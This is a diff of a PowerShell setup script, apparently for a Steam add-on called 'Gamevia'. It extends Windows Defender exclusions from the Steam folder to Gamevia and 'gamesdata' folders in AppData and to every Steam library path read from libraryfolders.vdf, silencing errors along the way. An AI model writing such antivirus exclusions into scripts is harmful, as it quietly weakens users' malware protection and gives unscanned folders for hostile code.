@@ -195,13 +195,64 @@ if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path -LiteralPath $s
     exit
 }
 
-# --- Defender Exclusion ---
+# --- Defender Exclusions ---
+$defenderExclusions = @()
+
+# Steam klasoru
+if (-not [string]::IsNullOrWhiteSpace($steamPath) -and (Test-Path -LiteralPath $steamPath)) {
+    $defenderExclusions += $steamPath
+}
+
+# Gamevia localappdata klasoru
+$gameviaFolder = "$env:LOCALAPPDATA\Gamevia"
+if (Test-Path $gameviaFolder) {
+    $defenderExclusions += $gameviaFolder
+}
+
+# gamesdata roaming klasoru
+$gamesDataPath = Join-Path $env:APPDATA "gamesdata"
+if (Test-Path $gamesDataPath) {
+    $defenderExclusions += $gamesDataPath
+}
+
+# Steam libraryfolders.vdf dosyalarindaki tum kütüphane yollari
+$steamLibraryVDFs = @(
+    "C:\Program Files (x86)\Steam\steamapps\libraryfolders.vdf"
+    "C:\Program Files (x86)\Steam\config\libraryfolders.vdf"
+)
+
+foreach ($vdfPath in $steamLibraryVDFs) {
+    if (Test-Path $vdfPath) {
+        try {
+            $vdfContent = Get-Content $vdfPath -Raw
+            $pathPattern = '"path"\s+"([^"]+)"'
+            $vdfMatches = [regex]::Matches($vdfContent, $pathPattern)
+
+            foreach ($m in $vdfMatches) {
+                $rawPath = $m.Groups[1].Value -replace '\\\\', '\'
+                if ((Test-Path -LiteralPath $rawPath -ErrorAction SilentlyContinue) -and ($defenderExclusions -notcontains $rawPath)) {
+                    $defenderExclusions += $rawPath
+                    Write-Log "Found Steam library: $rawPath" "SUCCESS"
+                }
+
+                $steamAppsPath = Join-Path $rawPath "steamapps"
+                if ((Test-Path -LiteralPath $steamAppsPath -ErrorAction SilentlyContinue) -and ($defenderExclusions -notcontains $steamAppsPath)) {
+                    $defenderExclusions += $steamAppsPath
+                }
+            }
+        }
+        catch { }
+    }
+}
+
 try {
     if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
         $existing = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
-        if (-not ($existing -and ($existing -contains $steamPath))) {
-            Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
-            Write-Log "Steam folder added to Defender exclusions." "SUCCESS"
+        foreach ($excl in $defenderExclusions) {
+            if (-not ($existing -and ($existing -contains $excl))) {
+                Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
+                Write-Log "Excluded: $excl" "SUCCESS"
+            }
         }
     }
 }
